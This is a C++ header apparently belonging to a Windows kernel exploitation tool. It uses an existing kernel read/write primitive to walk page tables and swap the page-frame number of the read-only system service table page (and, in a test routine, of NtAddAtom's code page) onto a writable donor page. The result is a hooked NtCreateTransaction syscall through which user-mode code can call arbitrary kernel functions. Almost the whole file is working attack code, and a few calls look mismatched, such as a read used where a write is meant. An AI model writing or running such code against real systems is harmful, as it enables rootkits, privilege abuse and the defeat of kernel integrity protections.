#pragma once
#include <stdint.h>
//
// Paging constants and macros
//
#define PAGE_SIZE_4KB           (1 << 12)
#define PAGE_MASK_4KB           0xFFF
#define PAGE_OFFSET_4KB(v)      ((v) & PAGE_MASK_4KB)

#define PAGE_SIZE_2MB           (1 << 21)
#define PAGE_MASK_2MB           0x1FFFFF
#define PAGE_OFFSET_2MB(v)      ((v) & PAGE_MASK_2MB)

#define PAGE_SIZE_1GB           (1 << 30)
#define PAGE_MASK_1GB           ((1 << 30) - 1)
#define NEXT_1GB_BOUNDARY(v)    (((ULONG64)(v) + PAGE_MASK_1GB) & ~((ULONG64)PAGE_MASK_1GB))


//
// Page table entry macros
//
#define PTE_PA_MASK             0x0000FFFFFFFFF000ULL
#define TABLE_ENTRY_PA(e)       ((ULONG64)(e) & PTE_PA_MASK)
#define TABLE_IDX_MASK          ((1 << 9) - 1)


//
// Page table index extraction
//
#define PML4_SHIFT              39
#define PDPT_SHIFT              30
#define PD_SHIFT                21
#define PT_SHIFT                12

#define PML4_IDX(v)             (((ULONG64)(v) >> PML4_SHIFT) & TABLE_IDX_MASK)
#define PDPT_IDX(v)             (((ULONG64)(v) >> PDPT_SHIFT) & TABLE_IDX_MASK)
#define PD_IDX(v)               (((ULONG64)(v) >> PD_SHIFT)   & TABLE_IDX_MASK)
#define PT_IDX(v)               (((ULONG64)(v) >> PT_SHIFT)   & TABLE_IDX_MASK)


//
// Page table entry flags
//
#define PTE_PRESENT             (1ULL << 0)
#define PTE_WRITABLE            (1ULL << 1)
#define PTE_LARGE_PAGE          (1ULL << 7)
#define PTE_GLOBAL              (1ULL << 8)
#define PTE_NO_EXECUTE          (1ULL << 63)


#define ARGS(x) (PVOID)(ULONG_PTR)(x)

DWORD m_dwKernelSize = 0;
DWORD m_dwKernelImageSize = NULL;


/*Page Table Entry structure*/

typedef struct _PAGE_TABLE_ENTRY {
    ULONG64 Present : 1;      // Bit 0
    ULONG64 ReadWrite : 1;      // Bit 1
    ULONG64 UserMode : 1;      // Bit 2
    ULONG64 PWT : 1;      // Bit 3
    ULONG64 PCD : 1;      // Bit 4
    ULONG64 Accessed : 1;      // Bit 5
    ULONG64 Dirty : 1;      // Bit 6
    ULONG64 PAT : 1;      // Bit 7
    ULONG64 Global : 1;      // Bit 8
    ULONG64 Reserved1 : 3;      // Bits 9-11
    ULONG64 PFN : 40;     // Bits 12-51 (Page Frame Number)
    ULONG64 Reserved2 : 11;     // Bits 52-62
    ULONG64 NoExecute : 1;      // Bit 63
} PAGE_TABLE_ENTRY, * PPAGE_TABLE_ENTRY;

/* Alias for backward compatibility */
typedef PAGE_TABLE_ENTRY PTE;

/* Field access macros for cleaner code */
#define pte_present     Present
#define pte_rw          ReadWrite
#define pte_nx          NoExecute
#define pte_pfn         PFN


class BusterCaller {
private:
    ULONG64 m_PaTableBase;
    ULONG64 m_PteBase;
    ULONG64 m_DirectoryBase;
    ULONG64 m_KiServiceTableVa;
    ULONG64 m_TargetSyscallIndex;  // The syscall we hook (NtCreateTransaction)
    ULONG64 m_KeServiceDescriptorTableVa;
    ULONG64 m_TargetEntryVa;
    ULONG64 m_TargetPteVa;
    PTE m_OriginalPte;
    DWORD m_OriginalServiceEntry;
    ULONG64 m_RwDonorPa;
    ULONG64 m_RwDonorVa;
    BYTE m_OriginalSsdtPage[4096];

    BOOL m_IsHooked;


    /**Converts physical address to virtual address using physical address table*/

    static ULONG64 PhysicalToVirtual(ULONG64 PaTableBase, ULONG64 PteBase, ULONG64 PhysAddr)
    {
        ULONG64 PaIndex = (PhysAddr >> 12) * 6;
        ULONG64 TableEntryVa = PaTableBase + PaIndex * 8;
        ULONG64 Value = 0;

        if (!ReadKernelMemory((PVOID)TableEntryVa, &Value, sizeof(Value)))
        {
            printf("PhysicalToVirtual: Failed to read table at 0x%llx for PA 0x%llx\n", TableEntryVa, PhysAddr);
            exit(1);
        }

        LONG64 VirtAddr = (Value << 0x19) - (PteBase << 0x19);
        VirtAddr >>= 0x10;

        return (ULONG64)VirtAddr + (PhysAddr & 0xFFF);
    }


    /**	Gets the physical address of a PTE for the given virtual address*	Walks all 4 levels of page tables (PML4 -> PDPT -> PD -> PT)**/
    static ULONG64 GetPtePhysicalAddress(ULONG64 TargetVa, ULONG64 DirectoryBase, ULONG64 PaTableBase, ULONG64 PteBase)
    {
        ULONG64 Va = TargetVa & ~0xFFFULL;

        // Walk PML4
        ULONG64 Pml4Va = PhysicalToVirtual(PaTableBase, PteBase, DirectoryBase);
        DWORD   Pml4Idx = PML4_IDX(Va);
        ULONG64 Pml4e = 0;

        ReadKernelMemory(PVOID(Pml4Va + Pml4Idx * 8), &Pml4e, 8);

        if (!(Pml4e & 1))
        {
            printf("[ERROR] PML4 entry not present\n");
            return 0;
        }

        // Walk PDPT
        ULONG64 PdptPa = Pml4e & PTE_PA_MASK;
        ULONG64 PdptVa = PhysicalToVirtual(PaTableBase, PteBase, PdptPa);
        DWORD   PdptIdx = PDPT_IDX(Va);
        ULONG64 Pdpte = 0;

        ReadKernelMemory(PVOID(PdptVa + PdptIdx * 8), &Pdpte, 8);

        if (!(Pdpte & 1))
        {
            printf("[ERROR] PDPT entry not present\n");
            return 0;
        }

        // Walk PD
        ULONG64 PdPa = Pdpte & PTE_PA_MASK;
        ULONG64 PdVa = PhysicalToVirtual(PaTableBase, PteBase, PdPa);
        DWORD   PdIdx = PD_IDX(Va);
        ULONG64 Pde = 0;

        ReadKernelMemory(PVOID(PdVa + PdIdx * 8), &Pde, 8);

        if (!(Pde & 1))
            return 0;

        // Walk PT
        ULONG64 PtPa = Pde & PTE_PA_MASK;
        DWORD   PtIdx = PT_IDX(Va);

        return PtPa + PtIdx * 8;
    }

    /*
    *	Find a writable kernel page to use as backing storage
    *
    */
    static ULONG64 FindWritableDonorPage(ULONG64 PaTableBase, ULONG64 PteBase, ULONG64 DirectoryBase)
    {
        ULONG64 BeepBase = GetBeep();

        printf("[*] Beep.sys base: 0x%llx\n", BeepBase);

        ULONG64 DataStart = BeepBase;
        printf("[*] Scanning for writable pages: 0x%llx - 0x%llx\n", DataStart, DataStart + 0x10000);

        for (int i = 0; i < 0x2000 * 100; i += 8)
        {
            ULONG64 TestVa = DataStart + (i * 0x1000);
            ULONG64 PtePa = GetPtePhysicalAddress(TestVa, DirectoryBase, PaTableBase, PteBase);

            if (!PtePa)
                continue;

            ULONG64 PteVa = PhysicalToVirtual(PaTableBase, PteBase, PtePa);

            if (!PteVa)
                continue;

            ULONG64 PteValue = 0;

            if (!ReadKernelMemory(PVOID(PteVa), &PteValue, sizeof(PteValue)))
                continue;

            // Check if page is present (bit 0) and writable (bit 1)
            if ((PteValue & 0x3) == 0x3)
            {
                ULONG64 PagePa = PteValue & PTE_PA_MASK;
                printf("[+] Found RW donor at VA 0x%llx -> PA 0x%llx\n", TestVa, PagePa);
                return PagePa;
            }
        }

        return 0;
    }



public:
    BusterCaller() : m_IsHooked(FALSE) {}

    BOOL Initialize()
    {
		BOOL m_bInitialized = false;

        char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

        PVOID data = nullptr;
        DWORD dwDataSize = 0;
        PIMAGE_NT_HEADERS pHeaders;
        PIMAGE_SECTION_HEADER pSection;

        if (!GetKernelImageInfo(reinterpret_cast<PVOID*>(&m_KernelAddr), &m_dwKernelSize, szKernelName)) {
            return false;
        }

        GetSystemDirectoryA(szKernelPath, MAX_PATH);
        strcat_s(szKernelPath, "\\");
        strcat_s(szKernelPath, szKernelName);

        if (ReadFromFile(szKernelPath, &data, &dwDataSize))
        {
            if (LdrMapImage(data, dwDataSize, &m_KernelImage, &m_dwKernelImageSize)) {
                LdrProcessRelocs(m_KernelImage, reinterpret_cast<PVOID>(m_KernelAddr));
            }
            LocalFree(data);
        }
        else {
            if (m_KernelImage) {
                LocalFree(m_KernelImage);
                m_KernelImage = nullptr;
                m_dwKernelImageSize = 0;
            }
        }

		auto MappedBase = (PBYTE)m_KernelImage;

        IMAGE_NT_HEADERS64* NtHeader = (IMAGE_NT_HEADERS64*)(MappedBase + ((IMAGE_DOS_HEADER*)MappedBase)->e_lfanew);

        // Locate KiSystemCall64
        DWORD KiSystemCall32Offset = 0;
        DWORD KiSystemCall64Offset = 0;
        for (DWORD i = NtHeader->OptionalHeader.BaseOfCode; i < NtHeader->OptionalHeader.SizeOfCode; i += 0x20) {
            ULONG64* Data = (ULONG64*)(MappedBase + i);
            if (Data[0] == 0x2524894865f8010f && Data[1] == 0x248b486500000010) {
                if (KiSystemCall32Offset == 0) {
                    KiSystemCall32Offset = i;
                }
                else {
                    KiSystemCall64Offset = i;
                    break;
                }
            }
        }

        // Locate KeServiceDescriptorTable via lea instruction
        DWORD LeaKeServiceDescriptorTableOffset = 0;
        for (DWORD i = KiSystemCall64Offset; i < KiSystemCall64Offset + 0x1000; i++) {
            if (!(MappedBase[i] == 0x4c && MappedBase[i + 1] == 0x8d && MappedBase[i + 2] == 0x15)) {
                continue;
            }
            if (!(MappedBase[i + 7] == 0x4c && MappedBase[i + 8] == 0x8d && MappedBase[i + 9] == 0x1d)) {
                continue;
            }
            LeaKeServiceDescriptorTableOffset = i;
            break;
        }

        // LeaKeServiceDescriptorTableOffset is already an RVA (found in mapped image)
        // The lea instruction is: 4C 8D 15 xx xx xx xx (lea r10, [rip+offset])
        // RIP points to the next instruction (current + 7 bytes)
        DWORD RipOffset;
        memcpy(&RipOffset, MappedBase + LeaKeServiceDescriptorTableOffset + 3, sizeof(RipOffset));
        
        // Calculate: KernelBase + InstructionRVA + InstructionLength(7) + RipOffset
        m_KeServiceDescriptorTableVa = m_KernelAddr + LeaKeServiceDescriptorTableOffset + 7 + RipOffset;
        
        extern ULONG64 GetCurrentEProcess();
        ULONG64 EprocessVa = GetCurrentEProcess();

        ULONG64 DirectoryBase = 0;
        if (!ReadKernelMemory(reinterpret_cast<PVOID>(EprocessVa + 0x28), &DirectoryBase, sizeof(DirectoryBase))) {
            printf("Cannot read DirectoryBase from EPROCESS\n");
            return FALSE;
        }

        ULONG64 MmGetVirtualForPhysicalVa = (ULONG64)GetKernelProcAddress("MmGetVirtualForPhysical");

        if (!MmGetVirtualForPhysicalVa) {
            return FALSE;
        }

        BYTE Buffer[32];
        ULONG64 PaTableBase, PteBase;
        if (!ReadKernelMemory(reinterpret_cast<PVOID>(MmGetVirtualForPhysicalVa + 0x10), Buffer, 32)) {
            printf("Cannot read info from MmGetVirtualForPhysicalVa\n");
            return FALSE;
        }
        memcpy(&PaTableBase, Buffer, sizeof(PaTableBase));
        memcpy(&PteBase, Buffer + 0x12, sizeof(PteBase));


        // Find the address of system call service entry for NtCreateTransaction
        ULONG64 NtCreateTransactionVa = (ULONG64)GetKernelProcAddress("NtCreateTransaction");

        // Read KeServiceDescriptorTable entries using virtual memory
       // ULONG64 KeServiceDescriptorTableVa = m_KeServiceDescriptorTableVa;
        ULONG64 KeServiceDescriptorTableData[4] = { 0 }; // [0]=ServiceTableBase, [1]=CounterTable, [2]=NumberOfServices, [3]=ArgumentTable

        if (!ReadKernelMemory(PVOID(m_KeServiceDescriptorTableVa), KeServiceDescriptorTableData, sizeof(KeServiceDescriptorTableData))) {
            printf("[-] Failed to read KeServiceDescriptorTable at VA 0x%llx\n", m_KeServiceDescriptorTableVa);
            return FALSE;
        }


        ULONG64 KiServiceTableVa = KeServiceDescriptorTableData[0];
        ULONG64 KiServiceTableNumber = KeServiceDescriptorTableData[2];

        printf("[+] KiServiceTable: 0x%llx\n", KiServiceTableVa);
        printf("[+] Number of services: 0x%llx\n", KiServiceTableNumber);

        // Calculate the shifted RVA for NtCreateTransaction
        int ShiftedRva = (int)(NtCreateTransactionVa - KiServiceTableVa) << 4;
        printf("[.] NtCreateTransaction shifted RVA: 0x%x\n", ShiftedRva);

        // Read the entire service table (each entry is a DWORD)
        SIZE_T ServiceTableSize = (SIZE_T)(KiServiceTableNumber * sizeof(DWORD));
        DWORD* Services = (DWORD*)malloc(ServiceTableSize);
        if (!Services) {
            printf("[-] Failed to allocate memory for service table\n");
            return FALSE;
        }

        if (!ReadKernelMemory(PVOID(KiServiceTableVa), Services, ServiceTableSize)) {
            printf("[-] Failed to read KiServiceTable\n");
            free(Services);
            return FALSE;
        }

        BOOL FoundService = FALSE;
        DWORD SavedServiceEntry = 0;
        ULONG64 ServiceEntryVa = 0;
        SIZE_T TargetIndex = 0;

        for (SIZE_T i = 0; i < KiServiceTableNumber; i++) {
            if ((Services[i] & 0xfffffff0) == ShiftedRva) {
                // Found the service
                printf("[+] Found target service. idx=0x%llx, value=0x%x\n", i, Services[i]);
                SavedServiceEntry = Services[i];
                ServiceEntryVa = KiServiceTableVa + i * sizeof(DWORD);
                TargetIndex = i;
                FoundService = TRUE;
                break;
            }
        }

        free(Services);

        if (!FoundService) {
            printf("[-] Failed to find NtCreateTransaction in service table\n");
            return FALSE;
        }

        printf("[+] Service entry VA: 0x%llx\n", ServiceEntryVa);

        m_PaTableBase = PaTableBase;
        m_PteBase = PteBase;
        m_DirectoryBase = DirectoryBase;
        m_KiServiceTableVa = KiServiceTableVa;
        m_TargetSyscallIndex = TargetIndex;
        m_IsHooked = FALSE;


        // Calculate target SSDT entry address
        m_TargetEntryVa = m_KiServiceTableVa + m_TargetSyscallIndex * sizeof(DWORD);

        // Find RW donor page
        m_RwDonorPa = FindWritableDonorPage(m_PaTableBase, m_PteBase, m_DirectoryBase);
        if (!m_RwDonorPa) {
            printf("[-] Failed to find RW donor page\n");
            return FALSE;
        }

		printf("[+] RW Donor PA: 0x%llx\n", m_RwDonorPa);

        m_RwDonorVa = PhysicalToVirtual(m_PaTableBase, m_PteBase, m_RwDonorPa);
        if (!m_RwDonorVa) {
            printf("[-] Failed to convert donor PA to VA\n");
            return FALSE;
        }

        printf("[+] RW Donor VA: 0x%llx\n", m_RwDonorVa);

        // Read original SSDT entry
        if (!ReadKernelMemory(PVOID(m_TargetEntryVa), &m_OriginalServiceEntry, sizeof(DWORD))) {
            printf("[-] Failed to read original SSDT entry\n");
            return FALSE;
        }

		printf("[+] Original SSDT entry: 0x%x\n", m_OriginalServiceEntry);

        // Get target PTE
        ULONG64 PageBase = m_TargetEntryVa & ~0xFFFULL;

		printf("[*] Target SSDT page base: 0x%llx\n", PageBase);
        ULONG64 TargetPtePa = GetPtePhysicalAddress(m_TargetEntryVa, m_DirectoryBase, m_PaTableBase, m_PteBase);
        if (!TargetPtePa) {
            printf("[-] Failed to get target PTE PA\n");
            return FALSE;
        }

		printf("[+] Target PTE PA: 0x%llx\n", TargetPtePa);
        m_TargetPteVa = PhysicalToVirtual(m_PaTableBase, m_PteBase, TargetPtePa);
        if (!m_TargetPteVa) {
            printf("[-] Failed to convert PTE PA to VA\n");
            return FALSE;
        }

		printf("[+] Target PTE VA: 0x%llx\n", m_TargetPteVa);
        // Read original PTE
        if (!ReadKernelMemory(PVOID(m_TargetPteVa), &m_OriginalPte, sizeof(PTE))) {
            printf("[-] Failed to read original PTE\n");
            return FALSE;
        }

        // Read original SSDT page
        if (!ReadKernelMemory(PVOID(PageBase), m_OriginalSsdtPage, 4096)) {
            printf("[-] Failed to read original SSDT page\n");
            return FALSE;
        }

        printf("[+] BusterCaller initialized successfully\n");

        return TRUE;
    }

    /*
    *	patch NtAddAtom to test read-only page modification
    */
    BOOL PatchNtAddAtomTest()
    {
        ULONG64 TargetVa = (ULONG64)GetKernelProcAddress("NtAddAtom");
        ULONG64 PaTableBase = m_PaTableBase;
        ULONG64 PteBase = m_PteBase;
        ULONG64 DirectoryBase = m_DirectoryBase;

        printf("\n[+] Patching NtAddAtom n");
        printf("[+] Target: 0x%llx\n", TargetVa);

        ULONG64 PageBase = TargetVa & ~0xFFFULL;

        // Find writable donor page
        printf("[*] Finding writable donor page...\n");
        ULONG64 DonorPa = FindWritableDonorPage(PaTableBase, PteBase, DirectoryBase);

        if (!DonorPa)
        {
            printf("[-] failed to find donor page\n");
            return FALSE;
        }
        printf("[+] Donor PA: 0x%llx\n", DonorPa);

        BYTE OriginalCode[4096];

        if (!ReadKernelMemory(PVOID(PageBase), OriginalCode, 4096))
        {
            printf("[-] Failed to read original code\n");
            return FALSE;
        }

        // calc offset of NtAddAtom within page
        SIZE_T FuncOffset = TargetVa & 0xFFF;
        printf("[*] Function offset in page: 0x%llx\n", FuncOffset);

        // save original bytes
        BYTE OriginalBytes[32];
        memcpy(OriginalBytes, OriginalCode + FuncOffset, 32);

        // create hooked page
        BYTE HookedCode[4096];
        memcpy(HookedCode, OriginalCode, 4096);

        // modify the hooked page with a marker pattern at the function start
        BYTE* PatchLocation = HookedCode + FuncOffset;

        // write marker bytes
        PatchLocation[0] = 0xDE;
        PatchLocation[1] = 0xAD;
        PatchLocation[2] = 0xBE;
        PatchLocation[3] = 0xEF;
        PatchLocation[4] = 0xCA;
        PatchLocation[5] = 0xFE;
        PatchLocation[6] = 0xBA;
        PatchLocation[7] = 0xBE;

        printf("[*] Modified first 8 bytes to marker pattern: DE AD BE EF CA FE BA BE\n");

        // write patched page to RW donor
        printf("[*] Writing patched page to RW donor...\n");
        ULONG64 RwVa = PhysicalToVirtual(PaTableBase, PteBase, DonorPa);
        if (!RwVa || !ReadKernelMemory(PVOID(RwVa), HookedCode, 4096)) {
            printf("[-] Failed to write patched page\n");
            return FALSE;
        }

        // get PTE
        ULONG64 TargetPtePa = GetPtePhysicalAddress(TargetVa, DirectoryBase, PaTableBase, PteBase);
        if (!TargetPtePa) {
            printf("[-] Failed to get PTE PA\n");
            return FALSE;
        }

        ULONG64 TargetPteVa = PhysicalToVirtual(PaTableBase, PteBase, TargetPtePa);
        if (!TargetPteVa) {
            printf("[-] Failed to get PTE VA\n");
            return FALSE;
        }

        // read original PTE
        PTE OriginalPte;
        if (!ReadKernelMemory(PVOID(TargetPteVa), &OriginalPte, sizeof(PTE))) {
            printf("[-] failed to read PTE\n");
            return FALSE;
        }
        printf("[+] Original PFN: 0x%llx\n", OriginalPte.PFN);

        // swap pfn to donor page
        printf("[*] Activating swap...\n");
        PTE HookedPte = OriginalPte;
        HookedPte.PFN = DonorPa >> 12;

        if (!WriteKernelMemory(PVOID(TargetPteVa), &HookedPte, sizeof(PTE))) {
            printf("[-] Failed to write hooked PTE\n");
            return FALSE;
        }
        printf("[+] NtAddAtom now points to our patched donor page\n");

        // verify the PTE swap by reading the function bytes
        printf("[*] Verifying by reading...\n");

        BYTE VerifyBytes[16];
        if (!ReadKernelMemory(PVOID(TargetVa), VerifyBytes, 16)) {
            printf("[-] Failed to read from target function\n");
            return FALSE;
        }

        printf("[*] Bytes read from NtAddAtom:\n   ");
        for (int i = 0; i < 16; i++) {
            printf("%02X ", VerifyBytes[i]);
        }
        printf("\n");

        // check if our marker is present
        if (VerifyBytes[0] == 0xDE && VerifyBytes[1] == 0xAD &&
            VerifyBytes[2] == 0xBE && VerifyBytes[3] == 0xEF &&
            VerifyBytes[4] == 0xCA && VerifyBytes[5] == 0xFE &&
            VerifyBytes[6] == 0xBA && VerifyBytes[7] == 0xBE) {
            printf("[+] Marker pattern verified: DE AD BE EF CA FE BA BE\n");
            printf("[+] Successfully modified a read-only kernel code page!\n");
        }
        else {
            printf("[-] Market not found - pfn swap failed failed\n");
            printf("[-] Expected: DE AD BE EF CA FE BA BE\n");
            return FALSE;
        }

        // restore original PTE
        printf("[*] Restoring original...\n");
        if (!WriteKernelMemory(PVOID(TargetPteVa), &OriginalPte, sizeof(PTE))) {
            printf("[-] WARNING: failed to restore PTE\n");
            return FALSE;
        }

        return TRUE;
    }

    /*
     * Hook SSDT to redirect to target function
     */
    BOOL HookSyscall(ULONG64 TargetFunctionVa) {
        if (m_IsHooked) {
            printf("[-] Already hooked, unhook first\n");
            return FALSE;
        }

        // Calculate new SSDT entry
        int NewShiftedRva = (int)(TargetFunctionVa - m_KiServiceTableVa) << 4;
        DWORD NewServiceEntry = (NewShiftedRva & 0xfffffff0) | (m_OriginalServiceEntry & 0xf);

        printf("[DEBUG] Original entry: 0x%x, New entry: 0x%x\n", m_OriginalServiceEntry, NewServiceEntry);
        printf("[DEBUG] Target function: 0x%llx, SSDT base: 0x%llx\n", TargetFunctionVa, m_KiServiceTableVa);

        // Create modified SSDT page
        BYTE ModifiedPage[4096];
        memcpy(ModifiedPage, m_OriginalSsdtPage, 4096);

        SIZE_T EntryOffset = m_TargetEntryVa & 0xFFF;
        *(DWORD*)(ModifiedPage + EntryOffset) = NewServiceEntry;
        // Write modified page to donor
        if (!WriteKernelMemory(PVOID(m_RwDonorVa), ModifiedPage, 4096)) {
            printf("[-] Failed to write modified page to donor\n");
            return FALSE;
        }

        // Swap PFN
        PTE ModifiedPte = m_OriginalPte;
        ModifiedPte.PFN = m_RwDonorPa >> 12;

        if (!WriteKernelMemory(PVOID(m_TargetPteVa), &ModifiedPte, sizeof(PTE))) {
            printf("[-] Failed to swap PFN\n");
            return FALSE;
        }

        printf("[+] SSDT hooked successfully to 0x%llx\n", TargetFunctionVa);
        m_IsHooked = TRUE;
        return TRUE;
    }

    /*
     * Unhook and restore original SSDT
     */
    BOOL Unhook() {
        if (!m_IsHooked) {
            return TRUE;
        }

        // Restore original PTE
        if (!WriteKernelMemory(PVOID(m_TargetPteVa), &m_OriginalPte, sizeof(PTE))) {
            printf("[-] Failed to restore original PTE\n");
            return FALSE;
        }

        m_IsHooked = FALSE;
        return TRUE;
    }

    /*
     * Call kernel function by name
     */
    BOOL CallKernelFunction(const char* FunctionName, PVOID* Args, DWORD ArgCount, PVOID* pRetVal) {
        // Get target function address
        PVOID FuncAddr = NULL;

        if ((FuncAddr = GetKernelProcAddress(FunctionName)) == NULL) {
            if (!strncmp(FunctionName, "Zw", 2)) {
                FuncAddr = GetKernelZwProcAddress(FunctionName);
            }
        }

        if (FuncAddr == NULL) {
            return FALSE;
        }

        printf("[DEBUG] Target function: %s @ 0x%llx\n", FunctionName, FuncAddr);


        // Hook SSDT to redirect to target function
        if (!HookSyscall((ULONG64)FuncAddr)) {
            return FALSE;
        }

        // Get NtCreateTransaction from ntdll
        HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
        if (!Ntdll) {
            Unhook();
            return FALSE;
        }

        typedef NTSTATUS(NTAPI* pNtCreateTransaction)(
            PHANDLE, ACCESS_MASK, PVOID, LPGUID, HANDLE,
            ULONG, ULONG, ULONG, PLARGE_INTEGER, PVOID);

        pNtCreateTransaction NtCreateTransactionFunc = (pNtCreateTransaction)GetProcAddress(Ntdll, "NtCreateTransaction");
        if (!NtCreateTransactionFunc) {
            Unhook();
            return FALSE;
        }

        // Call the hooked syscall with provided arguments
        // Args[] contains the actual values to pass in registers (RCX, RDX, R8, R9, stack...)
        // x64 calling convention: first 4 args in RCX, RDX, R8, R9
        // Use ULONG_PTR to capture full 64-bit return value (for functions returning pointers like ExAllocatePool)
        ULONG_PTR ReturnValue = 0;

        printf("[DEBUG] Calling with %d args\n", ArgCount);

        // Function pointer type that returns ULONG_PTR to capture full 64-bit return
        typedef ULONG_PTR(NTAPI* pGenericSyscall)(
            ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
            ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);

        pGenericSyscall GenericCall = (pGenericSyscall)NtCreateTransactionFunc;

        // The Args array contains PVOID values that are cast from the actual parameter values
        // We need to pass them directly as register values, not as pointers
        if (ArgCount == 0) {
            ReturnValue = GenericCall(0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        else if (ArgCount == 1) {
            // RCX gets Args[0] value directly
            ReturnValue = GenericCall((ULONG_PTR)Args[0], 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        else if (ArgCount == 2) {
            // RCX=Args[0], RDX=Args[1]
            ReturnValue = GenericCall((ULONG_PTR)Args[0], (ULONG_PTR)Args[1], 0, 0, 0, 0, 0, 0, 0, 0);
        }
        else if (ArgCount == 3) {
            // RCX=Args[0], RDX=Args[1], R8=Args[2]
            ReturnValue = GenericCall((ULONG_PTR)Args[0], (ULONG_PTR)Args[1], (ULONG_PTR)Args[2], 0, 0, 0, 0, 0, 0, 0);
        }
        else if (ArgCount >= 4) {
            // RCX=Args[0], RDX=Args[1], R8=Args[2], R9=Args[3]
            ReturnValue = GenericCall((ULONG_PTR)Args[0], (ULONG_PTR)Args[1], (ULONG_PTR)Args[2], (ULONG_PTR)Args[3], 0, 0, 0, 0, 0, 0);
        }

        printf("[DEBUG] Call returned: 0x%llx\n", ReturnValue);

        // Store return value
        if (pRetVal) {
            *pRetVal = (PVOID)ReturnValue;
        }
        // Unhook
        Unhook();

        return TRUE;
    }

    ~BusterCaller() {
        if (m_IsHooked) {
            Unhook();
        }
    }
};

/*
 * Global kernel caller instance
 */
static BusterCaller* g_KernelCaller = nullptr;

/*
 * Wrapper to call kernel function by name
 */
BOOL CallKernelFunctionViaName(const char* FunctionName, PVOID* Args, DWORD ArgCount, PVOID* pRetVal) {
    if (!g_KernelCaller) {
        printf("[-] Kernel caller not initialized\n");
        return FALSE;
    }

    return g_KernelCaller->CallKernelFunction(FunctionName, Args, ArgCount, pRetVal);
}

/*
 * Template helpers for kernel function calling
 */
#define ARGS(x) (PVOID)(ULONG_PTR)(x)

template<typename... Args>
void CallKernelFunctionNoRet(const char* KernelFunctionName, Args... args) {
    PVOID ArgsArray[] = { ARGS(args)... };
    CallKernelFunctionViaName(KernelFunctionName, ArgsArray, sizeof...(args), NULL);
}

template<typename RetType, typename... Args>
RetType CallKernelFunction(const char* KernelFunctionName, Args... args) {
    PVOID ArgsArray[] = { ARGS(args)... };
    PVOID pRet = nullptr;

    BOOL bResult = CallKernelFunctionViaName(KernelFunctionName, ArgsArray, sizeof...(args), &pRet);

    if (bResult) {
        return (RetType)(ULONG_PTR)pRet;
    }
    else {
        return RetType();
    }
}

/*
 * Initialize the buster caller
 */
BOOL InitializeBusterCaller() {
    if (g_KernelCaller) {
        delete g_KernelCaller;
    }

    g_KernelCaller = new BusterCaller();
    return g_KernelCaller->Initialize();
}

